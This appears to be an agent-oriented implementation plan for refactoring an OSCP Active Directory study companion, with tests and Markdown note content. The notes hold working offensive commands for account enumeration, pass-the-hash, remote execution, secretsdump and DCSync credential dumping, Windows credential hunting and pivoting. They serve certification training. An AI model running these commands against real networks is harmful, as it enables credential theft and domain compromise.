# AD Companion Refactor Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Refactor the OSCP Active Directory companion from protocol-by-protocol commands into outcome-based account, access, credential, privilege, dumping, reuse, and pivot flows.

**Architecture:** Keep the existing companion parser and rendered UI. Consolidate fenced commands under stable Markdown headings, then update `content/_playbooks/active-directory.yaml` so each decision step references the consolidated outcome. Add content-level contract tests before changing the notes so broken heading references fail immediately.

**Tech Stack:** Markdown content, YAML playbooks, Vitest content tests, existing Playwright suite.

## Global Constraints

- OSCP-only scope.
- Commands stay in fenced Markdown blocks and are referenced by `section/page#heading`.
- Do not add a shared port variable; listener ports stay literal (`4444`, `8000`, `1080`, `9000`).
- Prefer commands already installed by `content/_setup.yaml`; mark any new tool dependency in setup too.
- Keep Domain in Machine variables, but omit `-d '{{DOMAIN}}'` from NetExec commands where current NetExec documentation demonstrates it as optional.
- Preserve the offline single-file build and existing localStorage profile schema.

---

### Task 1: Add failing AD coverage contracts

**Files:**

- Modify: `src/ad-companion.content.test.ts`
- Test: `src/ad-companion.content.test.ts`

**Interfaces:**

- Consumes: `parsePlaybook('active-directory', source)` and content validation through existing `npm test`.
- Produces: Stable heading IDs and node IDs used by Tasks 2-5.

- [ ] **Step 1: Write the failing test**

Replace the coverage test with these assertions:

```ts
import { describe, expect, it } from 'vitest'
import source from '../content/_playbooks/active-directory.yaml?raw'
import { parsePlaybook } from './lib/playbooks'

const { playbook, errors } = parsePlaybook('active-directory', source)

describe('Active Directory companion coverage', () => {
  it('starts with intake and covers outcome-based AD decision areas', () => {
    expect(errors).toEqual([])
    expect(playbook?.start).toBe('intake')
    expect(Object.keys(playbook?.nodes ?? {})).toEqual(
      expect.arrayContaining([
        'scan',
        'anonymous',
        'services',
        'credential-attacks',
        'spray',
        'asrep',
        'kerberoast',
        'coerce',
        'graph',
        'access',
        'host-enum',
        'winpeas',
        'privesc',
        'certificates',
        'delegate',
        'dump',
        'reuse',
        'pivot',
        'proof',
      ]),
    )
  })

  it('uses consolidated enumeration, access, dumping, and pivot command groups', () => {
    const commandRefs = [
      ...Object.values(playbook!.nodes).flatMap((node) => node.commands),
      ...Object.values(playbook!.nodes).flatMap((node) =>
        node.services.flatMap((service) => service.commands),
      ),
    ]
    expect(commandRefs).toEqual(
      expect.arrayContaining([
        'active-directory/ad-enumeration#identify-domain-and-dc',
        'active-directory/ad-enumeration#enumerate-accounts-without-credentials',
        'active-directory/ad-enumeration#enumerate-accounts-with-credentials',
        'active-directory/ad-enumeration#enumerate-groups-and-members',
        'active-directory/ad-enumeration#password-policy-and-kerberos-controls',
        'active-directory/ad-enumeration#bloodhound-ce-collection',
        'services/remote-access#winrm-checks-and-shell',
        'services/remote-access#winrm-hash-and-certificate-authentication',
        'active-directory/credential-access#remote-execution',
        'active-directory/credential-dumping#secretsdump-cheat-sheet',
        'windows/credential-harvesting#first-pass-credential-hunt',
        'windows/windows-privesc#privilege-escalation-decision',
        'pivoting/tunnelling#static-route',
      ]),
    )
  })

  it('keeps service evidence and optional WinPEAS branches without making LDAP the only account source', () => {
    expect(playbook?.nodes.services?.services.map((service) => service.id)).toEqual(
      expect.arrayContaining(['smb', 'rpc', 'ldap', 'kerberos', 'dns', 'winrm', 'mssql', 'web', 'rdp']),
    )
    expect(playbook?.nodes['host-enum']?.options.some((option) => option.next === 'winpeas')).toBe(true)
    expect(playbook?.nodes.anonymous?.commands).toContain(
      'active-directory/ad-enumeration#enumerate-accounts-without-credentials',
    )
    expect(playbook?.nodes.services?.services.find((service) => service.id === 'ldap')?.commands).toContain(
      'active-directory/ad-enumeration#enumerate-groups-and-members',
    )
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run src/ad-companion.content.test.ts`
Expected: FAIL because the consolidated headings do not exist yet.

- [ ] **Step 3: Implement Task 2-5 content changes**

Do not edit the test to weaken it; add the referenced headings and graph links.

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run src/ad-companion.content.test.ts`
Expected: PASS.

---

### Task 2: Consolidate AD enumeration notes

**Files:**

- Modify: `content/active-directory/ad-enumeration.md`
- Modify: `content/active-directory/smb-enumeration.md`

**Interfaces:**

- Produces headings:
  - `active-directory/ad-enumeration#identify-domain-and-dc`
  - `active-directory/ad-enumeration#enumerate-accounts-without-credentials`
  - `active-directory/ad-enumeration#enumerate-accounts-with-credentials`
  - `active-directory/ad-enumeration#enumerate-groups-and-members`
  - `active-directory/ad-enumeration#password-policy-and-kerberos-controls`
  - `active-directory/ad-enumeration#bloodhound-ce-collection`
  - `active-directory/ad-enumeration#tls-certificate-identity`
  - `active-directory/smb-enumeration#smb-login-and-share-access`
  - `active-directory/smb-enumeration#gpp-and-autologin-credentials`

- [ ] **Step 1: Rewrite `content/active-directory/ad-enumeration.md`**

Use this structure and command content:

````md
---
title: AD enumeration
order: 1
tags: [ad, ldap, smb, netexec, bloodhound]
---

## Identify domain and DC

Run against each domain machine in turn, switching the default profile so RHOST tracks the machine under test. Record hostname, domain label and signing status.

```bash
nxc smb {{RHOST}}
dig @{{DC}} _ldap._tcp.dc._msdcs.{{DOMAIN}} SRV +short
```
````

The SMB label may be NetBIOS and does not prove a host is a DC. Match DNS SRV results to reachable controller addresses. [NetExec host enumeration](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-hosts), [Microsoft discovery record](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7fcdce70-5205-44d6-9c3a-260e616a2f04).

## Enumerate accounts without credentials

Try SMB, RPC, Kerberos and LDAP independently. A failure on one protocol says nothing about the others. Save verified names as users.txt before spraying or roasting.

```bash
nxc smb {{RHOST}} -u '' -p '' --shares
nxc smb {{RHOST}} -u guest -p '' --shares
rpcclient -N -U '' '{{RHOST}}' -c 'enumdomusers;querydispinfo'
/home/kali/tools/kerbrute/kerbrute userenum --dc '{{DC}}' -d '{{DOMAIN}}' users.txt -o kerberos-users.txt
ldapsearch -x -H 'ldap://{{DC}}' -s base namingcontexts
```

Descriptions and comments can contain useful operational clues. Kerbrute userenum sends preauthentication requests and does not increment failed-login counts. [NetExec null sessions](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-null-sessions), [Samba rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html), [Kerbrute user enumeration](https://github.com/ropnop/kerbrute#user-enumeration), [ldapsearch](https://www.openldap.org/software/man.cgi?query=ldapsearch).

## Enumerate accounts with credentials

Use the account's actual authority. SMB and LDAP can both return users; use both when one is denied or incomplete.

```bash
nxc smb {{RHOST}} -u '{{USER}}' -p '{{PASS}}' --users
nxc ldap {{DC}} -u '{{USER}}' -p '{{PASS}}' --users
nxc smb {{RHOST}} -u '{{USER}}' -p '{{PASS}}' --rid-brute
```

Record returned usernames, descriptions and RID evidence. Failure on one protocol does not prove the domain has no users. [NetExec SMB users](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-domain-users), [NetExec LDAP users](https://www.netexec.wiki/ldap-protocol/enumerate-users), [NetExec RID enumeration](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-users-by-bruteforcing-rid).

## Enumerate groups and members

Target a confirmed DC with a valid domain credential. Start with high-value groups, then investigate groups found in BloodHound or ACL output.

```bash
nxc ldap {{DC}} -u '{{USER}}' -p '{{PASS}}' --groups
nxc ldap {{DC}} -u '{{USER}}' -p '{{PASS}}' --groups 'Domain Admins'
nxc ldap {{DC}} -u '{{USER}}' -p '{{PASS}}' --groups 'Remote Management Users'
```

Group membership explains access better than a flat user list. Save memberships that connect a user to a host, delegation right, privileged group or certificate enrollment right. [NetExec group enumeration](https://www.netexec.wiki/ldap-protocol/enumerate-group-members).

## Password policy and Kerberos controls

Check lockout controls before repeated logins. Fine-grained policies can differ from the domain default.

```bash
nxc smb {{DC}} -u '{{USER}}' -p '{{PASS}}' --pass-pol
nxc ldap {{DC}} -u '{{USER}}' -p '{{PASS}}' --pso
```

Record the lockout threshold and observation window before spraying. [Domain password policy](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-domain-password-policy-1), [fine-grained PSOs](https://www.netexec.wiki/ldap-protocol/dump-pso).

## BloodHound CE collection

```bash
nxc ldap {{DC}} -u '{{USER}}' -p '{{PASS}}' --bloodhound --collection All --dns-server {{DC}}
```

Use CE ingestion and review collection errors before trusting missing paths. Verify All's methods for the installed NetExec version; it can contact member hosts and differs from SharpHound. Treat graph edges as leads, not proof. [NetExec CE default](https://www.netexec.wiki/ldap-protocol/bloodhound-ingestor), [Python collector limits](https://github.com/dirkjanm/BloodHound.py).

## TLS certificate identity

For an HTTPS or LDAPS service, inspect the certificate for DNS names, hostnames and CA naming clues. Set RPORT to the confirmed TLS listener and DOMAIN to a relevant hostname when SNI is required.

```bash
openssl s_client -connect '{{RHOST}}:{{RPORT}}' -servername '{{DOMAIN}}' </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -ext subjectAltName
```

Certificate names are leads to verify through DNS and service evidence. [OpenSSL s_client](https://docs.openssl.org/master/man1/openssl-s_client/), [x509](https://docs.openssl.org/master/man1/openssl-x509/).

````

- [ ] **Step 2: Rewrite `content/active-directory/smb-enumeration.md`**

Use this structure:

```md
---
title: AD enumeration over SMB
order: 2
tags: [ad, smb, netexec, shares, users]
---

## SMB login and share access

Use the account's actual authority. Run against the intended member host so RHOST is that box. A successful login does not prove administrator or WinRM rights.

```bash
# Domain account
nxc smb {{RHOST}} -u '{{USER}}' -p '{{PASS}}'
# Local account
nxc smb {{RHOST}} -u '{{USER}}' -p '{{PASS}}' --local-auth
nxc smb {{RHOST}} -u '{{USER}}' -p '{{PASS}}' --shares
smbclient -L '//{{RHOST}}' -U '{{USER}}%{{PASS}}'
````

Record readable shares and inspect them with [smbclient](services/common-services#smb). [NetExec authentication](https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-domain), [NetExec shares](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-shares-and-access).

## GPP and autologin credentials

With authenticated access to SYSVOL, check for legacy Group Policy Preferences and autologin residue. These are historical misconfigurations, not guaranteed findings.

```bash
nxc smb {{DC}} -u '{{USER}}' -p '{{PASS}}' -M gpp_password
nxc smb {{DC}} -u '{{USER}}' -p '{{PASS}}' -M gpp_autologin
```

Also inspect [SYSVOL scripts and configuration](services/common-services#sysvol) directly. Validate recovered credentials with their actual authority. [NetExec module listing](https://www.netexec.wiki/smb-protocol/list-modules).

````

- [ ] **Step 3: Run content validation**

Run: `npx vitest run src/content.check.test.ts src/ad-companion.content.test.ts`
Expected: AD contract still fails until Task 5 rewires the YAML; content files themselves must parse.

---

### Task 3: Consolidate access, execution, and dumping

**Files:**
- Modify: `content/services/remote-access.md`
- Modify: `content/active-directory/credential-access.md`
- Modify: `content/active-directory/credential-dumping.md`

**Interfaces:**
- Produces headings:
  - `services/remote-access#winrm-checks-and-shell`
  - `services/remote-access#winrm-hash-and-certificate-authentication`
  - `active-directory/credential-access#remote-execution`
  - `active-directory/credential-access#pass-the-hash`
  - `active-directory/credential-dumping#secretsdump-cheat-sheet`

- [ ] **Step 1: Replace the first three WinRM sections in `content/services/remote-access.md` with `WinRM checks and shell`**

```md
## WinRM checks and shell

Check the credential, verify execution, then open an interactive shell when WinRM rights exist. Current NetExec defaults probe HTTP/5985 and HTTPS/5986; add -S for HTTPS.

```bash
nxc winrm {{RHOST}} -u '{{USER}}' -p '{{PASS}}'
nxc winrm {{RHOST}} -u '{{USER}}' -p '{{PASS}}' -X whoami
evil-winrm -i {{RHOST}} -P {{RPORT}} -u '{{USER}}' -p '{{PASS}}'
````

Record the returned identity; an SMB or WinRM login alone does not prove the intended rights. In an Evil-WinRM shell, use `upload` and `download` for files. [NetExec WinRM authentication](https://www.netexec.wiki/winrm-protocol/authentication), [NetExec command execution](https://www.netexec.wiki/winrm-protocol/command-execution), [Evil-WinRM](https://github.com/Hackplayers/evil-winrm).

- [ ] **Step 2: Keep `WinRM hash and certificate authentication` and remove redundant prose about DOMAIN**

Use the existing hash/certificate commands, but change the intro to:

```md
Use the credential form actually recovered. NTHASH is the NT hash. For certificate authentication, PFX contains the certificate and private key; openssl converts it to the PEM files Evil-WinRM expects. Use -S for HTTPS.
```

- [ ] **Step 3: Replace `Remote Windows command` in `content/active-directory/credential-access.md` with `Remote execution`**

````md
## Remote execution

Requires administrative access and a working remote execution method. Verify the resulting identity before treating access as proof.

```bash
# NetExec SMB command
nxc smb {{RHOST}} -u '{{USER}}' -p '{{PASS}}' -x whoami
# Impacket execution
impacket-psexec '{{USER}}:{{PASS}}'@{{RHOST}}
impacket-wmiexec '{{USER}}:{{PASS}}'@{{RHOST}}
impacket-smbexec '{{USER}}:{{PASS}}'@{{RHOST}}
```
````

Use the method that matches the host and recovered credential. NetExec's admin indicator is a lead; check the command result itself. [NetExec execution](https://www.netexec.wiki/smb-protocol/command-execution/execute-remote-command), [Impacket examples](https://github.com/fortra/impacket/tree/master/examples).

````

- [ ] **Step 4: Expand pass-the-hash in `content/active-directory/credential-access.md`**

```md
## Pass-the-Hash

Replay an NT hash where a password would otherwise go. Set NTHASH to the hash after the colon in `aad3b435b51404eeaad3b435b51404ee:<NTHASH>`.

```bash
impacket-psexec -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{RHOST}}
impacket-wmiexec -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{RHOST}}
impacket-smbexec -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{RHOST}}
````

Requires administrator on the target; a domain-admin hash reaches the controller directly. Verify the resulting identity. [Impacket examples](https://github.com/fortra/impacket/tree/master/examples).

````

- [ ] **Step 5: Add `Secretsdump cheat sheet` to `content/active-directory/credential-dumping.md` immediately after `Secretsdump remotely`**

```md
## Secretsdump cheat sheet

Choose the source matching the access you have. Save complete output and label every credential with the host and authority it came from.

```bash
# Remote password
impacket-secretsdump '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{RHOST}}
# Remote NT hash
impacket-secretsdump -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{RHOST}}
# DCSync with replication rights
impacket-secretsdump '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{DC}}'
# Local hives or NTDS
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
````

LSA `DefaultPassword` and `_SC_*` entries are plaintext pivots; SAM lines give local hashes; cached `$DCC2$` lines crack offline. [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).

````

- [ ] **Step 6: Run content validation**

Run: `npx vitest run src/content.check.test.ts`
Expected: PASS for content links; the AD contract remains red until Task 5.

---

### Task 4: Expand credential hunting, privilege escalation, and pivoting

**Files:**
- Modify: `content/windows/credential-harvesting.md`
- Modify: `content/windows/windows-privesc.md`
- Modify: `content/pivoting/tunnelling.md`
- Modify: `content/_setup.yaml`

**Interfaces:**
- Produces headings:
  - `windows/credential-harvesting#first-pass-credential-hunt`
  - `windows/windows-privesc#privilege-escalation-decision`
  - `pivoting/tunnelling#static-route`

- [ ] **Step 1: Add `First-pass credential hunt` after the frontmatter intro in `content/windows/credential-harvesting.md`**

```md
## First-pass credential hunt

From a new Windows session, check the locations that most often reveal reusable credentials or decisive leads. Review only accessible files and preserve context around each finding.

```powershell
whoami /all
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Get-ChildItem -Path C:\ -Filter '*transcript*' -Recurse -ErrorAction SilentlyContinue
````

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
type "C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings"
type C:\inetpub\wwwroot\web.config
dir /s /b C:\inetpub\*.db C:\inetpub\*.config C:\Users\*.db 2>nul
```

Also inspect readable SYSVOL scripts, share contents, service configuration, scheduled tasks, application configuration and downloaded binaries. When a file looks useful in Evil-WinRM, download it and inspect locally.

````

- [ ] **Step 2: Add `Privilege escalation decision` near the top of the Windows privilege-escalation section in `content/windows/windows-privesc.md`**

Insert after the `Token privileges` section:

```md
## Privilege escalation decision

Match the lead to the execution path before running a tool:

- [ ] Identity and groups: `whoami /all`, privileged group membership, logon rights.
- [ ] Token privileges: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege, SeBackupPrivilege or SeLoadDriverPrivilege.
- [ ] Service or task path: writable binary, configuration, arguments, dependency or trigger.
- [ ] Application configuration: web.config, database files, scripts, history and transcripts.
- [ ] Potato path: service-account shell with impersonation rights; test PrintSpoofer, GodPotato or SigmaPotato.
- [ ] Automated sweep: run WinPEAS only after manual checks stall or to validate one concrete lead.
````

- [ ] **Step 3: Add `Static route` before `Ligolo-ng tunnel` in `content/pivoting/tunnelling.md`**

````md
## Static route

When the pivot has a direct interface on the internal network and routing through that host is permitted, add a temporary route on Kali. Replace the example subnet and pivot address with evidence from the target.

```bash
sudo ip route add 10.10.139.0/24 via {{RHOST}}
sudo ip route del 10.10.139.0/24 via {{RHOST}}
```
````

Verify with `ping` and a scanner before assuming every host is reachable. Remove the route when the pivot session ends.

```

- [ ] **Step 4: Ensure setup still covers tools used by the new commands**

Run: `grep -E "netexec|impacket|evil-winrm|kerbrute|chisel|ligolo|peass|mimikatz" content/_setup.yaml`
Expected: all tools are already present. If a new command introduces a tool not in setup, add an install and verify entry in `content/_setup.yaml`.

- [ ] **Step 5: Run content validation**

Run: `npx vitest run src/content.check.test.ts`
Expected: PASS.

---

### Task 5: Rewire the AD companion graph

**Files:**
- Modify: `content/_playbooks/active-directory.yaml`

**Interfaces:**
- Consumes: all headings produced in Tasks 2-4.
- Produces: the graph expected by Task 1.

- [ ] **Step 1: Update command references**

Make these exact reference changes:
- `domain.commands` becomes `[active-directory/ad-enumeration#identify-domain-and-dc, active-directory/ad-enumeration#tls-certificate-identity]`
- `anonymous.commands` becomes `[active-directory/ad-enumeration#enumerate-accounts-without-credentials, active-directory/smb-enumeration#smb-login-and-share-access, services/common-services#sysvol]`
- SMB service commands become `[active-directory/smb-enumeration#smb-login-and-share-access, active-directory/smb-enumeration#gpp-and-autologin-credentials, services/common-services#sysvol]`
- LDAP service commands become `[active-directory/ad-enumeration#enumerate-accounts-with-credentials, active-directory/ad-enumeration#enumerate-groups-and-members, active-directory/ad-enumeration#password-policy-and-kerberos-controls, active-directory/ad-enumeration#bloodhound-ce-collection]`
- WinRM service commands become `[services/remote-access#winrm-checks-and-shell]`
- `access.commands` becomes `[services/remote-access#winrm-checks-and-shell, services/remote-access#winrm-hash-and-certificate-authentication, services/remote-access#rdp]`
- `host-enum.commands` starts with `[windows/windows-privesc#situational-awareness, windows/windows-privesc#token-privileges, windows/windows-privesc#privilege-escalation-decision, windows/credential-harvesting#first-pass-credential-hunt, ...]` and keeps the existing manual-check references after it.
- `dump.commands` starts with `[active-directory/credential-dumping#secretsdump-cheat-sheet, ...]` and keeps the existing technique-specific headings after it.
- `reuse.commands` includes `active-directory/credential-access#remote-execution` and the existing login, Kerberos and pass-the-hash headings.
- `pivot.commands` becomes `[pivoting/tunnelling#static-route, pivoting/tunnelling#ligolo-ng-tunnel, pivoting/tunnelling#chisel-reverse-socks, pivoting/tunnelling#scan-through-a-tunnel]`

- [ ] **Step 2: Update node prose so it describes outcomes, not LDAP-only enumeration**

- In `services`, change the LDAP service body to: `Use a confirmed DC and valid domain credential. Pull users, groups and policy as one account picture; collect graph data only after reviewing collector coverage.`
- In `anonymous`, change the body to: `Try independent SMB, RPC, LDAP, Kerberos and DNS checks. Save valid usernames, descriptions, shares and files before attempting authentication.`
- In `access`, change the body to: `Verify WinRM or RDP access, then open the matching shell. Use password, NT hash or certificate authentication as appropriate; verify the resulting identity and host.`
- In `host-enum`, change the body to: `Establish identity, groups, privileges, OS/build and architecture. Hunt common credential locations manually, then validate one concrete host privilege path before optional automation.`
- In `dump`, change the body to: `Use the secretsdump source matching your access: remote admin, DCSync rights, local hives or NTDS. Keep each credential tied to its source host and authority.`

- [ ] **Step 3: Run focused tests**

Run: `npx vitest run src/ad-companion.content.test.ts src/content.check.test.ts`
Expected: PASS.

---

### Task 6: Verify the rendered refactor end to end

**Files:**
- No new files expected.
- Cleanup: remove Playwright `test-results` if generated and not ignored.

**Interfaces:**
- Consumes: Tasks 1-5.

- [ ] **Step 1: Run the full verification suite**

Run: `npm run verify`
Expected: formatting, lint, 101+ unit/content tests, build, and 128+ browser tests pass.

- [ ] **Step 2: Inspect the final diff**

Run: `git status --short && git diff --stat`
Expected: only intended content/test/docs/plan files are modified; no test-results output remains.

- [ ] **Step 3: Review for stale protocol-centric wording**

Run: `grep -R "LDAP and directory objects\|Domain users\|Domain groups\|Remote Windows command" content src e2e`
Expected: no stale heading names or node text remain, except historical documentation that is intentionally unchanged.

- [ ] **Step 4: Commit only if the user asks**

Do not run `git commit` unless the user explicitly asks. The worktree may already contain the separately verified My port removal.
```
